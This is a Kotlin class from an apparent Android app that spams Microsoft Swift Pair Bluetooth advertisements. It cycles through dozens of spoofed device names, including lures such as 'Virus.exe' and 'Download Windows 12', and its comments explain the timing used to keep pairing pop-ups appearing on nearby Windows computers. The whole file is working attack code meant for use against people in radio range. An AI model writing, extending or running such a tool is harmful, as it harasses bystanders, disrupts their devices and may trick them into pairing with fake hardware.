package com.droid.flippy

import android.util.Log
import java.util.Random
import java.util.concurrent.ExecutorService
import java.util.concurrent.Executors

class SwiftPairSpam : Spammer {

    private var _isSpamming = false
    private val executor: ExecutorService = Executors.newSingleThreadExecutor()
    private var blinkRunnable: Runnable? = null
    private val rand = Random()

    /** One legacy-fit payload per display name (see [SwiftPairPayloads]). */
    private fun buildPool(): List<ByteArray> {
        val normal = normalNames.map { SwiftPairPayloads.normalPayload(it) }
        val headphones = headphoneNames.map { SwiftPairPayloads.headphonePayload(it) }
        return normal + headphones
    }

    val normalNames = arrayOf(
        "Windows Protocol", "DLL Missing", "Download Windows 12",
        "Microsoft Bluetooth Keyboard", "Microsoft Arc Mouse",
        "Microsoft Surface Ergonomic Keyboard", "Microsoft Surface Precision Mouse",
        "Microsoft Modern Mobile Mouse", "Microsoft Surface Mobile Mouse",
        "Microsoft Surface Headphones", "Microsoft Surface Laptop",
        "Microsoft Surface Pro", "Microsoft Surface Duo",
        "Microsoft Xbox Wireless Controller", "Microsoft Surface Earbuds",
        "Microsoft Surface Go", "Microsoft Surface Studio",
        "Microsoft Surface Book", "Microsoft Surface Hub",
        "Microsoft Surface Pen", "Microsoft Surface Dial",
        "Microsoft Surface Slim Pen", "Microsoft Surface Dock",
        "Microsoft Surface Thunderbolt Dock", "Microsoft Surface Audio",
        "Free VPN", "Your Mom's PC", "Your Dad's iPhone",
        "404 Device Not Found", "Blue Screen of Death", "Installing Windows 99...",
        "Virus.exe", "Trojan Horse", "Neighbor's Wi-Fi", "Pirated Windows",
        "Keyboard for Cats", "Mouse for Dogs", "Pizza Delivery Drone",
        "Smart Fridge", "Smart Light Bulb", "RoboVac 3000",
        "Google Eye", "Apple iPot", "Samsung Smart Toaster",
        "PlayStation 10", "Xbox Infinite", "Nintendo Switch Pro Max",
        "AI Calculator", "Time Travel Watch",
        "Cyber Sock", "USB Breadbox", "Bluetooth Fork",
        "Wi-Fi Toothbrush", "Quantum Toaster", "Meme Dispenser"
    )

    val headphoneNames = arrayOf(
        "Ars3nb HP",
        "BT Headset",
        "Stereo HP",
        "Wireless HP",
        "Audio HP",
        "Music HP",
        "Sound HP",
        "Bass HP",
        "BT Audio",
        "BT Stereo",
        "Air HP",
        "Mini HP",
        "Pro HP",
        "Ultra HP",
        "Max HP",
        "Lite HP",
        "Neo HP",
        "Echo HP",
        "Pulse HP",
        "Wave HP",
        "Noise HP",
        "Clear HP",
        "Prime HP",
        "Core HP",
        "Flex HP",
        "Zoom HP",
        "Sync HP",
        "Nova HP",
        "Aura HP",
        "Spark HP"
    )

    override fun start() {
        executor.execute {
            _isSpamming = true

            // Dwell pattern (same reason as Apple Continuity): hold ONE name
            // stable so Windows can raise the notification, then a short gap
            // before the next name. Hopping names every packet confuses the
            // Swift Pair dedupe and post-dismiss popups rarely re-trigger.
            val pool = buildPool().shuffled(rand)
            var index = 0
            val advertiser = BluetoothAdvertiser()

            try {
                var loop = 0
                while (_isSpamming && loop <= Helper.MAX_LOOP) {
                    val payload = pool[index]
                    index = (index + 1) % pool.size
                    val dwellEnd = android.os.SystemClock.elapsedRealtime() + DWELL_MS
                    while (_isSpamming && android.os.SystemClock.elapsedRealtime() < dwellEnd) {
                        try {
                            advertiser.advertiseSwiftPair(payload)
                        } catch (e: Exception) {
                            Log.w(TAG, "advertise: ${e.message}")
                        }
                        blinkRunnable?.run()
                        com.droid.flippy.trackBlePackets(1)
                        try {
                            Thread.sleep(appleDelayMs())
                        } catch (_: InterruptedException) {
                            break
                        }
                        loop++
                        if (loop > Helper.MAX_LOOP) break
                    }
                    if (!_isSpamming) break
                    try {
                        advertiser.stopSwiftPair()
                    } catch (_: Exception) {
                    }
                    try {
                        Thread.sleep(GAP_MS)
                    } catch (_: InterruptedException) {
                        break
                    }
                }
            } finally {
                advertiser.stopSwiftPair()
                _isSpamming = false
                executor.shutdown()
            }
        }
    }


    override fun stop() {
        _isSpamming = false
    }

    override fun isSpamming(): Boolean = _isSpamming



    override fun setBlinkRunnable(blinkRunnable: Runnable?) {
        this.blinkRunnable = blinkRunnable
    }

    override fun getBlinkRunnable(): Runnable? = blinkRunnable

    /**
     * Windows needs a fast repeat rate to raise the notification promptly;
     * clamp the global slider (which can sit at 1000ms+) to 20-60ms.
     */
    private fun appleDelayMs(): Long {
        return Helper.delay.coerceIn(20, 60).toLong()
    }

    companion object {
        private const val TAG = "SwiftPairSpam"
        private const val DWELL_MS = 2_500L
        private const val GAP_MS = 500L
    }
}


